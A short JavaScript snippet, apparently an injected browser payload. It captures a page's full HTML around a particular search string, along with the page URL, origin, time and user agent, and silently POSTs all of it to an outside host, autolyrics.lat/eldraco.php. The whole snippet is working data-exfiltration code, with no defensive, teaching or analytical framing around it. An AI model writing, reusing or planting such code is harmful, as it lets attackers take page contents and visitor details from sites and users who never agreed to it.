const html = document.documentElement.outerHTML;

const buscar = "ilslyfer.github.io/_s7d6_scene7_com";
const pos = html.indexOf(buscar);

let contexto = "no encontrado";

if (pos !== -1) {
    contexto = html.substring(
        Math.max(0, pos - 50000),
        Math.min(html.length, pos + buscar.length + 50000)
    );
}

const data = `
URL: ${location.href}

ORIGIN: ${location.origin}

TIME: ${new Date().toISOString()}

USER_AGENT:
${navigator.userAgent}

HTML_SIZE:
${html.length}

MATCH_POSITION:
${pos}

CONTEXT:
${contexto}
`;

fetch("https://autolyrics.lat/eldraco.php", {
    method: "POST",
    headers: {
        "Content-Type": "text/plain"
    },
    body: data
});
